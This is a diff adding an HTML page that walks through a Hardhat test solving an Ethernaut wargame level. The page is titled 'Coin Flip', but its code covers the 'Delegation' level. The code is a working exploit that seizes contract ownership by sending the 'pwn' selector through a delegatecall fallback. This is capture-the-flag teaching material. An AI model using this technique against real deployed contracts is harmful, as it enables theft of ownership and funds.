@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>Ethernaut 6: Coin Flip</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>Ethernaut 6: Coin Flip</h1>
+
+        
+      </div>
+      
+        
+        
+        <div class='highlight'><pre><span class="hljs-keyword">import</span> {artifacts, ethers} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;hardhat&#x27;</span>
+<span class="hljs-keyword">import</span> {<span class="hljs-title class_">Contract</span>, <span class="hljs-title class_">Signer</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;ethers&#x27;</span>
+
+<span class="hljs-keyword">import</span> {<span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>, expect, expectStatusOK} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./testUtil&#x27;</span>
+
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LEVEL_ADDRESS</span> = <span class="hljs-string">&#x27;0x9451961b7Aea1Df57bc20CC68D72f662241b5493&#x27;</span>
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">INSTANCE_ADDRESS</span> = <span class="hljs-string">&#x27;0x0C2Ac4E510561942eb130a6598a94abE24fF3Ae0&#x27;</span>
+
+<span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;06 Delegation&#x27;</span>, <span class="hljs-function">() =&gt;</span> {
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">ethernaut</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">instance</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signer</span>: <span class="hljs-title class_">Signer</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signerAddress</span>: <span class="hljs-built_in">string</span>
+
+  <span class="hljs-title function_">before</span>(<span class="hljs-keyword">async</span> () =&gt; {
+    ethernaut = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;Ethernaut&#x27;</span>, <span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>)
+    instance = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;Delegation&#x27;</span>, <span class="hljs-variable constant_">INSTANCE_ADDRESS</span>)
+
+    <span class="hljs-keyword">const</span> signers = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getSigners</span>()
+    signer = signers[<span class="hljs-number">0</span>]
+    signerAddress = <span class="hljs-keyword">await</span> signer.<span class="hljs-title function_">getAddress</span>()
+  })</pre></div>
+      
+        
+        <p><code>Delegation</code> has a <code>fallback</code> function which relays whatever call data is sent
+to <code>Delegate</code>, which it calls using <code>delegatecall</code>. Since <code>Delegate</code> has a <code>pwn</code>
+function which sets <code>owner</code> to <code>msg.sender</code>, we become owner by executing that
+function in the context of <code>Delegation</code>. This is achieved by sending the function
+signature of <code>pwn</code> as call data in the transaction.</p>
+
+        <div class='highlight'><pre>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&quot;sends tx with encoded &#x27;pwn&#x27; function data to instance&quot;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">const</span> delegateArtifact = <span class="hljs-keyword">await</span> artifacts.<span class="hljs-title function_">readArtifact</span>(<span class="hljs-string">&#x27;Delegate&#x27;</span>)
+    <span class="hljs-keyword">const</span> iface = <span class="hljs-keyword">new</span> ethers.<span class="hljs-property">utils</span>.<span class="hljs-title class_">Interface</span>(delegateArtifact.<span class="hljs-property">abi</span>)
+    <span class="hljs-keyword">const</span> fndata = iface.<span class="hljs-title function_">encodeFunctionData</span>(<span class="hljs-string">&#x27;pwn&#x27;</span>)
+    <span class="hljs-keyword">const</span> params = {
+      <span class="hljs-attr">to</span>: instance.<span class="hljs-property">address</span>,
+      <span class="hljs-attr">data</span>: fndata,
+      <span class="hljs-attr">gasLimit</span>: <span class="hljs-number">1000000</span>,
+    }
+    <span class="hljs-keyword">const</span> tx = <span class="hljs-keyword">await</span> signer.<span class="hljs-title function_">sendTransaction</span>(params)
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expectStatusOK</span>(tx)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;has become owner&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">const</span> ownerAddr = <span class="hljs-keyword">await</span> instance.<span class="hljs-title function_">owner</span>()
+    <span class="hljs-title function_">expect</span>(ownerAddr).<span class="hljs-property">to</span>.<span class="hljs-title function_">equal</span>(signerAddress)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;is validated&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expect</span>(ethernaut.<span class="hljs-title function_">submitLevelInstance</span>(instance.<span class="hljs-property">address</span>))
+      .<span class="hljs-property">to</span>.<span class="hljs-title function_">emit</span>(ethernaut, <span class="hljs-string">&#x27;LevelCompletedLog&#x27;</span>)
+      .<span class="hljs-title function_">withArgs</span>(signerAddress, <span class="hljs-variable constant_">LEVEL_ADDRESS</span>).<span class="hljs-property">eventually</span>
+  })
+})</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
